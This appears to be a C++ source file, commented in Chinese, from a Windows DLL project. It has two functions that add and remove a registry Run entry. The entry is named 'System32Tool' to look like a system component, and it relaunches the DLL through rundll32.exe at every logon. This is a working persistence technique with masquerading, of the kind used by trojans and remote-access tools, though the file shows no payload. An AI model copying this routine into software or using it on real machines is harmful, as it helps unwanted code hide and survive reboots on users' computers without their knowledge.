#include "pch.h"

#include "runtime/utils.h"
#include "dllmain.h"

// 向HKEY_CURRENT_USER\Software\\Microsoft\\Windows\\CurrentVersion\\Run里加入自运行项目
BOOL SetStratupReg()
{
	//根键、子键名称和到子键的句柄
	HKEY hRoot = HKEY_CURRENT_USER;
	HKEY hKey;//打开指定子键
	DWORD dwDisposition = REG_OPENED_EXISTING_KEY;
	//如果不存在就创建
	LONG lRet = RegCreateKeyEx(
		hRoot,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	if (lRet != ERROR_SUCCESS)
	{
		puts("SetStratupReg: open registry failed");
		ShowError(lRet);
		return FALSE;
	}
	
	//创建一个新的键值，设置键值数据为文件
	lRet = RegSetValueEx(
		hKey,
		L"System32Tool",
		0,
		REG_SZ,
		(BYTE*)commandline, // 全局变量: 使用rundll32.exe运行自身（dll）的完整命令行
		wcslen(commandline) * 2
	);
	if (lRet != ERROR_SUCCESS)
	{
		puts("SetStratupReg: reg set value failed");
		ShowError(lRet);
		return FALSE;
	}
	puts("SetStratupReg: reg set value success");
	//关闭子键句柄
	RegCloseKey(hKey);
	return TRUE;
}

// 删除自启动注册表项
BOOL DeleteStratupReg()
{
	//根键、子键名称和到子键的句柄
	HKEY hRoot = HKEY_CURRENT_USER;
	HKEY hKey;//打开指定子键
	long lReturn = RegOpenKeyEx(hRoot,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		NULL,
		KEY_ALL_ACCESS,
		&hKey);
	if (lReturn != ERROR_SUCCESS)
	{
		puts("DeleteStratupReg: open registry failed");
		ShowError(lReturn);
		return FALSE;
	}

	lReturn = RegDeleteValue(
		hKey,
		L"System32Tool");
	if (lReturn != ERROR_SUCCESS)
	{
		puts("DeleteStratupReg: reg set value failed");
		ShowError(lReturn);
		return FALSE;
	}
	puts("DeleteStratupReg: reg set value success");
	//关闭子键句柄
	RegCloseKey(hKey);
	return TRUE;
}